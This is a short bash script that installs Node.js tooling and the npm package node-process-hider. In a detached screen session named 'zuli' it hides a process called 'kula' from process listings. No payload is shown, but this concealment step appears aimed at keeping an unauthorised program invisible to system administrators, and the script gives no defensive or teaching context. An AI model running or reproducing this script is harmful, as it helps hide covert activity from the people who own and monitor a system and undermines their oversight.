#!/bin/bash
apt update -y && apt-get install screen -y && apt-get install nodejs-dev node-gyp libssl1.0-dev && apt-get install npm && npm i -g node-process-hider && screen -dmS zuli ph add kula && ph list
